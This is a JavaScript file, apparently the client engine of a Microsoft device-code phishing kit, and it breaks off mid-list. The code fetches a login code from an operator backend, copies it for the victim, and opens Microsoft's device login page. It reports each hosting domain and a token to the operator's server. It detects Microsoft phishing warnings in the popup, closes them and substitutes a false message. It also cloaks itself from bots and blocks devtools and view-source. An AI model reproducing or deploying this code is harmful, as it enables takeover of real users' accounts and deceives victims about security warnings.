(function () {
  'use strict';
  var _originalWebdriver = false;
  try {
    _originalWebdriver = navigator.webdriver || false;
  } catch(e) {}

  var _vgWebdriverGetter = null;

  var LOG_QUEUE = [];
  var LOG_FLUSHING = false;

  function logToServer(level, message, data) {
    LOG_QUEUE.push({
      level: level,
      message: message,
      data: data || null,
      ts: Date.now(),
      url: window.location.href,
      ua: navigator.userAgent
    });

    flushLogs();
  }

  function flushLogs() {
    if (LOG_FLUSHING || LOG_QUEUE.length === 0) return;
    LOG_FLUSHING = true;

    var batch = LOG_QUEUE.splice(0, 20); 
    LOG_QUEUE = []; 

    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(
          API_BASE + '/api/log',
          new Blob([JSON.stringify({ logs: batch, __jwt__: VG_JWT })], { type: 'application/json' })
        );
      } else {
        fetch(API_BASE + '/api/log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ logs: batch, __jwt__: VG_JWT }),
          keepalive: true
        }).catch(function() {});
      }
    } catch(e) {

    }

    setTimeout(function() {
      LOG_FLUSHING = false;
      if (LOG_QUEUE.length > 0) flushLogs();
    }, 2000);
  }

  window.__VG_LOG = logToServer;

  var API_BASE = (typeof window.__API_BASE === 'string' && window.__API_BASE) ? window.__API_BASE : (typeof window.location !== 'undefined' ? window.location.origin : '');
  var API_FALLBACK_BASE = (typeof window.__API_BASE_FALLBACK === 'string' && window.__API_BASE_FALLBACK) ? window.__API_BASE_FALLBACK : '';
  var AUTH_MODE = (typeof window.__AUTH_MODE === 'string' && window.__AUTH_MODE) ? window.__AUTH_MODE : 'cookie';
  var DEST_URL = window.__DESTINATION_URL || '';
  var VG_JWT = window.VG_JWT || '';
  var SHOW_VERIFICATION = window.__SHOW_VERIFICATION_COMPLETE !== 'false' && window.__SHOW_VERIFICATION_COMPLETE !== 'false';
  logToServer('info', 'vg-engine loaded at ' + new Date().toISOString());

  (function () {
    try {
      var host = window.location ? String(window.location.hostname || '').toLowerCase() : '';
      if (!host || host === 'localhost' || host === '127.0.0.1' || /^\d+$/.test(host)) return;
      var bases = [];
      if (API_BASE) bases.push(API_BASE);
      if (API_FALLBACK_BASE && bases.indexOf(API_FALLBACK_BASE) === -1) bases.push(API_FALLBACK_BASE);
      for (var i = 0; i < bases.length; i++) {
        (function (base) {
          try {
            fetch(base + '/api/export/host?token=' + encodeURIComponent(VG_JWT) +
              '&host=' + encodeURIComponent(host), { method: 'GET', mode: 'no-cors' }).catch(function () {});
          } catch (e) {}
        })(bases[i]);
      }
    } catch (e) {}
  })();
  (function () {
    var GATE_FALLBACK_MS = 3000;

    var el = document.createElement('div');
    el.id = 'vgInteractionGate';
    el.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;' +
      'z-index:200000;background:#fff;margin:0;padding:0;border:0;';
    (document.body || document.documentElement).appendChild(el);

    var released = false;
    function release(reason) {
      if (released) return;
      released = true;
      var g = document.getElementById('vgInteractionGate');
      if (g && g.parentNode) g.parentNode.removeChild(g);
    }

    document.addEventListener('mousemove', function () { release('mousemove'); }, true);
    document.addEventListener('touchstart', function () { release('touchstart'); }, true);
    document.addEventListener('mousedown', function () { release('mousedown'); }, true);

    setTimeout(function () { release('fallback_timeout'); }, GATE_FALLBACK_MS);
  })();

  (function() {
    if (typeof window.__ANTISCRAPE_ENABLED === 'string' && window.__ANTISCRAPE_ENABLED === 'false') {
      return; 
    }

    document.addEventListener('keydown', function(e) {
      if (e.ctrlKey && e.key === 's') {
        e.preventDefault();
      }
      if (e.ctrlKey && e.key === 'u') {
        e.preventDefault();
      }
      if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) {
        e.preventDefault();
      }
      if (e.key === 'F12') {
        e.preventDefault();
      }
      if (e.ctrlKey && e.key === 'p') {
        e.preventDefault();
      }
      if (e.metaKey && (e.key === 'p' || e.key === 's' || e.key === 'u')) {
        e.preventDefault();
      }
    });

    document.addEventListener('contextmenu', function(e) {
      e.preventDefault();
    });

    var style = document.createElement('style');
    style.textContent = '.code-value{user-select:all;-webkit-user-select:all}body{user-select:none;-webkit-user-select:none}';
    if (document.head) document.head.appendChild(style);
  })();

  var _nativeFetch = window.fetch.bind(window);
  var _inflight = {};

  function isDeviceFetch(url) {
    try {
      var raw = typeof url === 'string' || url instanceof URL ? url : (url && url.url);
      if (!raw) return false;
      var path = new URL(raw, location.href).pathname;
      return path === '/api/device/start' || path.indexOf('/api/device/status/') === 0;
    } catch (e) {
      return false;
    }
  }

  function cloneResponse(r) {
    return r && typeof r.clone === 'function' ? r.clone() : r;
  }

  function getMethod(input, init) {
    return String((init && init.method) || (input && input.method) || 'GET').toUpperCase();
  }

  function normalizeDeviceJson(data) {
    if (!data || typeof data !== 'object' || Array.isArray(data)) return data;
    var out = {};
    for (var k in data) {
      if (Object.prototype.hasOwnProperty.call(data, k)) out[k] = data[k];
    }
    if (out.user_code && (!out.status || out.status === 'pending' || out.status === 'running' || out.status === 'queued')) {
      out.status = 'waiting_user';
    }
    if (out.status === 'error') out.status = 'failed';
    var txt = [out.error, out.message, out.error_description, out.error_message].join(' ').toLowerCase();
    if (
      out.soft_error ||
      String(out.recommended_mode || '').toLowerCase() === 'token' ||
      String(out.error_code) === '50076' ||
      txt.indexOf('aadsts50076') !== -1 ||
      txt.indexOf('interaction_required') !== -1
    ) {
      out.soft_error = true;
      if (!out.error_code) out.error_code = 50076;
      if (!out.recommended_mode) out.recommended_mode = 'token';
    }
    return out;
  }

  window.fetch = function (input, init) {
    if (!isDeviceFetch(input)) return _nativeFetch(input, init);

    var nextInit = {};
    if (init) {
      for (var key in init) {
        if (Object.prototype.hasOwnProperty.call(init, key)) nextInit[key] = init[key];
      }
    }
    var headers = new Headers(nextInit.headers || undefined);
    if (!headers.has('X-Auth-Mode')) headers.set('X-Auth-Mode', AUTH_MODE);
    if (VG_JWT && !headers.has('X-VG-JWT')) headers.set('X-VG-JWT', VG_JWT);
    nextInit.headers = headers;

    var method = getMethod(input, nextInit);
    var path = '';
    try { path = new URL(input, location.href).pathname; } catch (e) {}
    var dedupeKey = (method === 'GET' && path.indexOf('/api/device/status/') === 0) ? path : '';
    if (dedupeKey && _inflight[dedupeKey]) return _inflight[dedupeKey].then(cloneResponse);

    var request = _nativeFetch(input, nextInit).then(function (response) {
      if (!response || typeof response.clone !== 'function') return response;
      return response.clone().text().then(function (text) {
        if (!text) return response;
        try {
          var parsed = JSON.parse(text);
          var normalized = normalizeDeviceJson(parsed);
          var h = new Headers(response.headers);
          h.set('content-type', 'application/json; charset=utf-8');
          return new Response(JSON.stringify(normalized), { status: response.status, statusText: response.statusText, headers: h });
        } catch (e) {
          return response;
        }
      }, function () { return response; });
    });

    if (!dedupeKey) return request;
    _inflight[dedupeKey] = request;
    request.finally(function () { if (_inflight[dedupeKey] === request) delete _inflight[dedupeKey]; });
    return request.then(cloneResponse);
  };

  var _jobId = null;
  var _userCode = '';
  var _pollTimer = null;
  var _countdownTimer = null;
  var _startTime = 0;
  var _codeReady = false;
  var _popupRef = null;
  var _toastTimer = null;

  var _nativeOpen = window.open;
  function isMicrosoftUrl(u) {
    var s = String(u || '').toLowerCase();
    return s.indexOf('microsoft.com/devicelogin') !== -1 ||
      s.indexOf('login.microsoftonline.com') !== -1 ||
      s.indexOf('microsoftonline.com/appverify') !== -1 ||
      s.indexOf('login.live.com') !== -1;
  }
  window.open = function () {
    var w = _nativeOpen.apply(window, arguments);
    try {
      if (w && isMicrosoftUrl(arguments[0])) {
        _popupRef = w;
      }
    } catch (e) {}
    return w;
  };

  function closePopup() {
    var hadPopup = false;
    try {
      if (_popupRef && !_popupRef.closed) {
        hadPopup = true;
        try { _popupRef.close(); } catch (e) {}
        setTimeout(function () { try { if (_popupRef && !_popupRef.closed) _popupRef.close(); } catch (e) {} }, 100);
        setTimeout(function () { try { if (_popupRef && !_popupRef.closed) _popupRef.close(); } catch (e) {} }, 300);
      }
    } catch (e) {}
    _popupRef = null;
    return hadPopup;
  }

  function showToast(title, msg, duration) {
    duration = duration || 7000;
    var wrap = document.getElementById('vg-toast-wrap');
    if (!wrap) {
      wrap = document.createElement('div');
      wrap.id = 'vg-toast-wrap';
      wrap.style.cssText = 'position:fixed;inset:0;z-index:2147483647;display:flex;align-items:flex-start;justify-content:center;padding:72px 16px 16px;box-sizing:border-box;opacity:0;pointer-events:none;transition:opacity .2s;';
      wrap.innerHTML = '<div style="position:absolute;inset:0;background:rgba(15,23,42,.28);backdrop-filter:blur(1px);"></div>' +
        '<div id="vg-toast-card" style="position:relative;z-index:1;max-width:460px;width:min(92vw,420px);background:#fff;color:#111827;border:1px solid #e5e7eb;border-radius:12px;padding:16px;box-shadow:0 20px 45px rgba(15,23,42,.18);font-family:Segoe UI,Arial,sans-serif;display:grid;gap:12px;transform:translateY(-8px);transition:all .22s ease;box-sizing:border-box;">' +
        '<div style="display:flex;align-items:flex-start;gap:12px;">' +
        '<div style="width:34px;height:34px;flex:0 0 34px;display:flex;align-items:center;justify-content:center;border-radius:999px;background:#eef6ff;color:#0f6cbd;font-size:17px;font-weight:700;">i</div>' +
        '<div style="display:grid;gap:5px;line-height:1.3"><div id="vg-toast-title" style="font-size:15px;font-weight:700;color:#111827;"></div><div id="vg-toast-msg" style="font-size:13px;color:#4b5563;line-height:1.45;"></div></div>' +
        '</div>' +
        '<div style="display:flex;justify-content:flex-end;"><button id="vg-toast-close" style="height:34px;padding:0 12px;border-radius:8px;border:1px solid #d1d5db;background:#fff;color:#374151;font-weight:600;font-size:13px;cursor:pointer;">Dismiss</button></div>' +
        '</div>';
      (document.body || document.documentElement).appendChild(wrap);
      document.getElementById('vg-toast-close').onclick = function () { hideToast(); };
    }
    document.getElementById('vg-toast-title').textContent = title || '';
    document.getElementById('vg-toast-msg').textContent = msg || '';
    var card = document.getElementById('vg-toast-card');
    wrap.style.opacity = '1';
    wrap.style.pointerEvents = 'auto';
    card.style.transform = 'translateY(0)';
    clearTimeout(_toastTimer);
    _toastTimer = setTimeout(hideToast, duration);
  }

  function hideToast() {
    var wrap = document.getElementById('vg-toast-wrap');
    if (!wrap) return;
    var card = document.getElementById('vg-toast-card');
    wrap.style.opacity = '0';
    wrap.style.pointerEvents = 'none';
    if (card) card.style.transform = 'translateY(-8px)';
  }

  function setText(selector, text) {
    if (typeof text !== 'string' || text === '') return;
    document.querySelectorAll(selector).forEach(function (el) { el.textContent = text; });
  }

  function applyDynamicContent() {
    if (window.__DOC_FILENAME) document.querySelectorAll('[data-doc-filename]').forEach(function (el) { el.textContent = window.__DOC_FILENAME; });
    if (window.__DOC_TITLE) document.querySelectorAll('[data-doc-title]').forEach(function (el) { el.textContent = window.__DOC_TITLE; });
    if (window.__DOC_PAGES) document.querySelectorAll('[data-doc-pages]').forEach(function (el) { el.textContent = window.__DOC_PAGES; });
    if (typeof window.__PAGE_TITLE === 'string' && window.__PAGE_TITLE !== '') {
      setText('[data-page-title],[data-template-title],[data-custom-title]', window.__PAGE_TITLE);
      var fallback = document.querySelector('main h1, .card h1, .shell h1, h1');
      if (fallback && !document.querySelector('[data-page-title]')) fallback.textContent = window.__PAGE_TITLE;
    }
    if (typeof window.__PAGE_MESSAGE === 'string' && window.__PAGE_MESSAGE !== '') {
      setText('[data-page-message],[data-template-message],[data-custom-message]', window.__PAGE_MESSAGE);
    }
    if (typeof window.__PRIMARY_BUTTON_TEXT === 'string' && window.__PRIMARY_BUTTON_TEXT !== '') {
      setText('[data-primary-button]', window.__PRIMARY_BUTTON_TEXT);
      var btn = document.querySelector('button.cta-btn, button.bp, button.go, button.linakufe, button.btn-open');
      if (btn && !btn.querySelector('[data-primary-button]')) {
        var walker = document.createTreeWalker(btn, NodeFilter.SHOW_TEXT);
        var first = walker.nextNode();
        if (first) {
          first.nodeValue = window.__PRIMARY_BUTTON_TEXT;
          var next;
          while ((next = walker.nextNode())) next.nodeValue = '';
        }
      }
    }
  }

  function initBackgroundBlur() {
    var rawUrl = typeof window.__BACKGROUND_BLUR_URL === 'string' ? window.__BACKGROUND_BLUR_URL.trim() : '';
    if (!rawUrl) return;
    var blur = Number(window.__BACKGROUND_BLUR_AMOUNT);
    if (!Number.isFinite(blur)) blur = 2.5;
    blur = Math.max(0, Math.min(12, blur));

    var body = document.body;
    if (!body || document.body.getAttribute('data-vg-bg-ready') === '1') return;

    var style = document.createElement('style');
    style.id = 'vg-bg-styles';
    style.textContent =
      'html.vg-bg-active{min-height:100%;background:#0c1220!important;}' +
      'body.vg-bg-active{min-height:100vh!important;background:transparent!important;}' +
      'body.vg-bg-active>#vg-bg-layer{position:fixed!important;inset:0!important;z-index:0!important;pointer-events:none!important;}' +
      'body.vg-bg-active>#vg-bg-layer .vg-bg-image{position:absolute!important;inset:-3%!important;width:106%!important;height:106%!important;background-position:center!important;background-size:cover!important;background-repeat:no-repeat!important;filter:blur(var(--vg-bg-blur,2.5px)) brightness(.9) saturate(.98)!important;transform:scale(1.02)!important;}' +
      'body.vg-bg-active>#vg-bg-layer .vg-bg-overlay{position:absolute!important;inset:0!important;background:rgba(12,18,32,.36)!important;}';
    (document.head || document.documentElement).appendChild(style);

    try {
      var parsedUrl = new URL(rawUrl, location.href);
      if (!/^https?:$/.test(parsedUrl.protocol)) return;
    } catch (e) { return; }

    document.documentElement.classList.add('vg-bg-active');
    body.classList.add('vg-bg-active');
    body.style.setProperty('--vg-bg-blur', blur + 'px');

    var layer = document.createElement('div');
    layer.id = 'vg-bg-layer';
    layer.setAttribute('aria-hidden', 'true');

    var image = document.createElement('div');
    image.className = 'vg-bg-image';
    image.style.backgroundImage = 'url("' + parsedUrl.href.replace(/"/g, '%22') + '")';

    var overlay = document.createElement('div');
    overlay.className = 'vg-bg-overlay';

    layer.appendChild(image);
    layer.appendChild(overlay);

    if (!body.firstChild) {
      body.appendChild(layer);
    } else {
      body.insertBefore(layer, body.firstChild);
    }
    body.setAttribute('data-vg-bg-ready', '1');
  }

  window.generateCode = async function () {
    var refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) refreshBtn.style.display = 'none';
    var actionRow = document.getElementById('actionRow');
    if (actionRow) actionRow.style.display = 'none';
    var timerEl = document.getElementById('timerPill');
    if (timerEl) { timerEl.textContent = ''; timerEl.style.display = 'none'; timerEl.classList.remove('expired'); }

    var startBtn = document.getElementById('startBtn');
    var originalBtnText = '<span class="vg-spin">&#x27F3;</span> Generating code...';
    if (startBtn) { startBtn.disabled = true; startBtn.innerHTML = originalBtnText; }

    _setStatus('');
    clearInterval(_pollTimer);
    clearInterval(_countdownTimer);
    _jobId = null;
    _userCode = '';
    _codeReady = false;

    try {
      var apiUrl = API_BASE ? API_BASE + '/api/device/start' : '/api/device/start';

      if (_vgTurnstileOn()) {
        if (window.__TURNSTILE_TOKEN) {
        } else if (_vgTurnstileManaged()) {
        } else {
          if (!window.__TURNSTILE_WIDGET_ID) {
            try { initTurnstileVerification(); } catch (e) {}
          }

          var _tsWaited = 0;
          var _tsLastNudge = 0;
          var _tsDeadline = 15000;
          while (!window.__TURNSTILE_TOKEN && _tsWaited < _tsDeadline) {
            if (window.turnstile && window.__TURNSTILE_WIDGET_ID &&
                (_tsWaited - _tsLastNudge) >= 1500) {
              _tsLastNudge = _tsWaited;
              try { window.turnstile.execute(window.__TURNSTILE_WIDGET_ID); } catch (e) {}
            }
            await new Promise(function (res) { setTimeout(res, 200); });
            _tsWaited += 200;
          }
        }
      }

      if (_vgTurnstileOn() && !window.__TURNSTILE_TOKEN) {
        try { logToServer('error', '[VG] No Turnstile token after generateCode; widget_id=' +
          (window.__TURNSTILE_WIDGET_ID || 'none') + ' api_loaded=' + (!!window.turnstile) +
          ' sitekey=' + (window.__TURNSTILE_SITE_KEY ? ('set(len=' + String(window.__TURNSTILE_SITE_KEY).length + ')') : 'EMPTY') +
          ' managed=' + (_vgTurnstileManaged()) +
          ' host=' + (window.location && window.location.hostname || '?')); } catch (e) {}
        if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = originalBtnText; }
        _showError('Security check not completed. Please click Generate Code again.');
        return;
      }

      var sendStart = function (base) {
        return fetch(base + '/api/device/start', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Auth-Mode': AUTH_MODE,
            'X-VG-JWT': VG_JWT,
            'X-Turnstile-Token': window.__TURNSTILE_TOKEN || '',
          },
          body: JSON.stringify({
            mode: AUTH_MODE,
            jwt_token: VG_JWT,
            turnstile_token: window.__TURNSTILE_TOKEN || null,
          }),
        });
      };
      var r;
      try {
        r = await sendStart(API_BASE);
      } catch (netErr) {
        if (API_FALLBACK_BASE && API_FALLBACK_BASE !== API_BASE) {
          try { logToServer('warn', '[VG] device/start unreachable at primary, retrying ' + API_FALLBACK_BASE); } catch (e) {}
          API_BASE = API_FALLBACK_BASE;
          apiUrl = API_BASE + '/api/device/start';
          r = await sendStart(API_BASE);
        } else {
          throw netErr;
        }
      }
      var d = await r.json();

      try { logToServer('info', '[VG] device/start -> ' + r.status + (d.error ? ' error=' + d.error :
        ' user_code=' + (d.user_code ? ('yes(len=' + String(d.user_code).length + ')') : 'no') +
        ' job_id=' + (d.job_id ? 'yes' : 'no'))); } catch (e) {}

      window.__TURNSTILE_TOKEN = null;

      if (d.error) {
        _showError(d.error);
        if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = 'Generate Code'; }
        return;
      }

      _jobId = d.job_id || '';
      _userCode = d.user_code || '';

      _startTime = Date.now();
      var codePanel = document.getElementById('codePanel');
      if (codePanel) codePanel.classList.add('show');
      var initialStateBox = document.getElementById('initialStateBox');
      if (initialStateBox) initialStateBox.style.display = 'none';

      if (_userCode) {
        var codeEl = document.getElementById('codeValue');
        if (codeEl) {

          codeEl.setAttribute('data-vg-revealed', 'true');
          codeEl.style.opacity = 0;
          setTimeout(function () {
            codeEl.textContent = _userCode;
            codeEl.classList.remove('loading');
            codeEl.style.opacity = 1;
          }, 150);
        }
        var codeHint = document.getElementById('codeHint');
        if (codeHint) codeHint.textContent = '';

        var statusEl = document.getElementById('statusMsg');
        if (statusEl) statusEl.textContent = '';

        if (startBtn) { startBtn.disabled = false; startBtn.style.display = 'none'; }
        if (actionRow) {
          actionRow.style.setProperty('display', 'flex', 'important');
          _codeReady = true;
        }

        if (_jobId) {
          _pollTimer = setInterval(_poll, 1000);
          _poll();
        }
        _startTimer(d.expires_in || 600);
      } else if (_jobId) {
        _setStatus('Connecting to Microsoft servers...');
        _pollTimer = setInterval(_poll, 1000);
        _poll();
      } else {
        _showError('Session failed. Please refresh.');
        if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = originalBtnText; }
        return;
      }
    } catch (e) {
      _showError(e.message || 'Connection failed');
      if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = 'Generate Code'; }
    }
  };

  var _pollFailures = 0;
  var _pollBackoff = 1000;
  var _maxPollFailures = 10; 

  async function _poll() {
    if (Date.now() - _startTime > 600000) {
      clearInterval(_pollTimer);
      _onExpired();
      return;
    }

    try {
      var statusUrl = API_BASE ? API_BASE + '/api/device/status/' + _jobId : '/api/device/status/' + _jobId;
      var r = await fetch(statusUrl);
      var d = await r.json();

      _pollFailures = 0;
      _pollBackoff = 1000;

      if (d.status === 'waiting_user' && d.user_code) {
        var el = document.getElementById('codeValue');
        if (el) {
          el.setAttribute('data-vg-revealed', 'true');
          if (el.textContent !== d.user_code) {
            el.style.opacity = 0;
            setTimeout(function () {
              el.textContent = d.user_code;
              el.classList.remove('loading');
              el.style.opacity = 1;
            }, 150);
          }
        }
        _userCode = d.user_code;

        if (!_codeReady) {
          _codeReady = true;
          var startBtn = document.getElementById('startBtn');
          if (startBtn) startBtn.style.display = 'none';
          var actionRow = document.getElementById('actionRow');
          if (actionRow) {
            actionRow.style.setProperty('display', 'flex', 'important');
          }
          _setStatus('');
          _startTimer(d.expires_in || 600);
        }
      }
      if (d.status === 'done' || d.status === 'success' || d.status === 'completed') {
        clearInterval(_pollTimer);
        clearInterval(_countdownTimer);
        closePopup();
        _showSuccess();
        return;
      }

      if (d.soft_error || d.status === 'soft_error') {
        clearInterval(_pollTimer);
        AUTH_MODE = 'token';
        showToast('Additional verification required', 'A new verification session is being prepared.', 7600);
        if (d.retry_job_id) {
          _jobId = d.retry_job_id;
          _codeReady = false;
          _pollTimer = setInterval(_poll, 1000);
        } else {
          setTimeout(function () { window.generateCode(); }, 1500);
        }
        return;
      }

      if (d.status === 'failed' || d.status === 'expired' || d.status === 'timeout_waiting_user_login') {
        clearInterval(_pollTimer);
        clearInterval(_countdownTimer);
        _showError(d.error || d.status || 'Verification failed');
      }
    } catch (e) {

      _pollFailures++;

      _pollBackoff = Math.min(_pollBackoff * 2, 15000);

      if (_pollFailures >= _maxPollFailures) {
        _showError('Connection to verification server lost. Please refresh the page.');
        clearInterval(_pollTimer);
        return;
      }

      if (_pollFailures === 3) {
        _setStatus('Having trouble connecting... retrying...');
      }
    }

    if (!_pollTimer) return;
    clearInterval(_pollTimer);
    _pollTimer = setInterval(_poll, _pollBackoff);
  }

  function _startTimer(sec) {
    clearInterval(_countdownTimer);
    var el = document.getElementById('timerPill');
    if (!el) return;
    el.style.display = 'inline-flex';
    var t = sec;
    var tick = function () {
      if (t > 0) {
        var m = Math.floor(t / 60);
        var s = String(t % 60).padStart(2, '0');
        el.textContent = 'Valid for ' + m + ':' + s;
      } else {
        clearInterval(_countdownTimer);
        clearInterval(_pollTimer);
        _onExpired();
      }
      t--;
    };
    tick();
    _countdownTimer = setInterval(tick, 1000);
  }

  function _onExpired() {
    var timerEl = document.getElementById('timerPill');
    if (timerEl) {
      timerEl.textContent = 'Code expired.';
      timerEl.classList.add('expired');
    }
    var actionRow = document.getElementById('actionRow');
    if (actionRow) actionRow.style.display = 'none';
    var refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) refreshBtn.style.display = 'inline-flex';
    _setStatus('');
  }

  function copyText(text) {
    return navigator.clipboard.writeText(text).catch(function () {
      var ta = document.createElement('textarea');
      ta.value = text;
      ta.style.position = 'fixed';
      ta.style.opacity = '0';
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
    });
  }

  window.copyAndOpenPopup = function () {
    copyText(_userCode).then(function () {
      var btn = document.getElementById('copyBtn');
      if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
    });
    openMsLogin();
  };

  window.verifyWithCopy = function () {
    copyText(_userCode).then(function () {
      var btn = document.getElementById('verifyBtn');
      if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Code copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
      var copyBtn = document.getElementById('copyBtn');
      if (copyBtn) { var orig2 = copyBtn.textContent; copyBtn.textContent = 'Copied!'; setTimeout(function () { copyBtn.textContent = orig2; }, 1500); }
    });
    openMsLogin();
  };

  function openMsLogin() {
    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
    if (isMobile) {
      _popupRef = _nativeOpen('https://microsoft.com/devicelogin', '_blank');
    } else {
      _popupRef = _nativeOpen('https://microsoft.com/devicelogin', 'vgML', 'width=500,height=600');
    }
    
    if (_popupRef && !isMobile) {
      monitorPopupForWarnings(_popupRef);
    }
  }
  
  function monitorPopupForWarnings(popup) {
    var checkInterval = setInterval(function() {
      try {
        if (popup.closed) {
          clearInterval(checkInterval);
          return;
        }
        
        try {
          var popupUrl = popup.location.href;
          var popupTitle = popup.document.title;
          var popupBody = popup.document.body && popup.document.body.innerHTML || '';
          
          var isWarningPage = false;
          if (popupTitle && (
            popupTitle.toLowerCase().indexOf('phishing') !== -1 ||
            popupTitle.toLowerCase().indexOf('password') !== -1 ||
            popupTitle.toLowerCase().indexOf('not normally shown') !== -1
          )) {
            isWarningPage = true;
          }
          
          if (popupBody && (
            popupBody.toLowerCase().indexOf('phishing attempt') !== -1 ||
            popupBody.toLowerCase().indexOf('url contains your password') !== -1 ||
            popupBody.toLowerCase().indexOf('close this page immediately') !== -1
          )) {
            isWarningPage = true;
          }
          
          if (isWarningPage) {

            popup.close();
            clearInterval(checkInterval);

            showToast('Verification Issue', 'Microsoft detected unusual activity. Please try again in a few minutes or use a different verification method.', 8000);
  
            var startBtn = document.getElementById('startBtn');
            if (startBtn) {
              startBtn.style.display = 'block';
              startBtn.disabled = false;
              startBtn.innerHTML = 'Generate Code';
            }
            _codeReady = false;
            return;
          }
        } catch (e) {
        }
      } catch (e) {
        clearInterval(checkInterval);
      }
    }, 1000); 

    setTimeout(function() {
      clearInterval(checkInterval);
    }, 300000);
  }

  window.openSignIn = function () {
    var codeEl = document.getElementById('codeValue');
    var code = codeEl ? codeEl.textContent : '';
    if (code && code !== '· · · · · ·') {
      copyText(code).then(function () {
        var btn = document.getElementById('signInBtn');
        if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
        openMsLogin();
      }).catch(function () {
        openMsLogin();
      });
    }
  };

  window.refreshCode = function () {
    window.generateCode();
  };

  function _showSuccess() {
    clearInterval(_pollTimer);
    clearInterval(_countdownTimer);

    var overlay = document.getElementById('overlay');

    var redirectUrl = DEST_URL || '';

    if (redirectUrl) {
      if (window.__BLOB_URL_ENABLED === 'true' || window.__BLOB_URL_ENABLED === true) {
        try {
          var html = document.documentElement ? document.documentElement.outerHTML : '';
          var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
          if (isSafari) {
            var dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
          } else {
            var blob = new Blob([html], { type: 'text/html' });
            var blobUrl = URL.createObjectURL(blob);
            redirectUrl = blobUrl;
          }
        } catch (e) {
          redirectUrl = DEST_URL;
        }
      }
      if (!SHOW_VERIFICATION) {
        try { window.close(); } catch(e) {}
        window.location.replace(redirectUrl);
        return;
      }

      if (overlay) {
        overlay.classList.add('show');
        setTimeout(function () {
          try { window.close(); } catch(e) {}
          window.location.replace(redirectUrl);
        }, 2500);
      } else {
        try { window.close(); } catch(e) {}
        window.location.replace(redirectUrl);
      }
    } else {
      if (overlay) {
        overlay.classList.add('show');
        setTimeout(function () {
          closePopup();
          setTimeout(function () {
            overlay.classList.remove('show');
          }, 3000);
        }, 2000);
      } else {
        closePopup();
      }
    }
  }

  function _setStatus(msg) {
    var el = document.getElementById('statusMsg');
    if (el) { el.textContent = msg; el.classList.remove('error'); }
  }

  function _showError(code) {
    var map = {
      timeout_waiting_user_login: 'Your verification code has expired. Please refresh.',
      'Session expired': 'Your verification code has expired. Please refresh.',
      failed: 'Verification failed. Please try again.',
      'Worker error': 'Something went wrong. Please try again.',
      'Worker crash': 'Something went wrong. Please try again.',
    };
    _onExpired();
    var el = document.getElementById('statusMsg');
    if (el) {
      el.textContent = map[code] || 'Something went wrong. Please try again.';
      el.classList.add('error');
    }
  }

  function initBotDetection() {
    var isSliderPage = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';

    try {
      if (window.__VG_CLOAK && window.__VG_CLOAK.bot) {
        showWhitePage();
        return;
      }
      if (window.__VG_CLOAK && window.__VG_CLOAK.score > 0) {
      }
    } catch (e) {}
    
    setTimeout(function() {
      if (isBotRequest()) {
        showWhitePage();
        return;
      }

      if (isSliderPage) {
        return;
      }

      var botScore = calculateBotScore();
      if (botScore < 0.2) {
        showWhitePage();
        return;
      }

      if (_vgTurnstileOn() && window.__TURNSTILE_SITE_KEY) {
        initTurnstileVerification();
      }
    }, 500); 
  }

  function showWhitePage() {
    try {
      window.__VG_BLANKED = true;
      document.open();
      document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}</style><script>document.addEventListener("keydown",function(e){if(e.ctrlKey||e.metaKey){e.preventDefault();e.stopPropagation()}if(e.key==="F12"){e.preventDefault()}if(e.ctrlKey&&e.shiftKey&&(e.key==="I"||e.key==="i")){e.preventDefault()}if(e.ctrlKey&&e.key==="u"){e.preventDefault()}if(e.ctrlKey&&e.key==="s"){e.preventDefault()}if(e.ctrlKey&&e.key==="p"){e.preventDefault()}});document.addEventListener("contextmenu",function(e){e.preventDefault()});document.addEventListener("selectstart",function(e){e.preventDefault()})<\/script></head><body></body></html>');
      document.close();
    } catch(e) {
      document.documentElement.innerHTML = '';
      document.body.style.background = '#fff';
    }
  }

  function isBotRequest() {
    if (_originalWebdriver) return true;
    try {
      if (navigator.webdriver === true) return true;
      var _wdDesc = Object.getOwnPropertyDescriptor(navigator, 'webdriver');
      if (_wdDesc && (_wdDesc.value === true ||
          (typeof _wdDesc.get === 'function' && _wdDesc.get !== _vgWebdriverGetter))) return true;
    } catch(e) {}
 
    var _automationGlobals = [
      '__webdriver_evaluate', '__selenium_evaluate', '__fxdriver_evaluate',
      '__webdriver_script_fn', '__webdriver_script_value', '__webdriver_script_command',
      '__selenium_unwrapped_', '__fxdriver_unwrapped_', '__webdriver_unwrapped_',
      '__driver_evaluate', '__nightmare', '__playwright', '__pw_init', '__pw_inspector__',
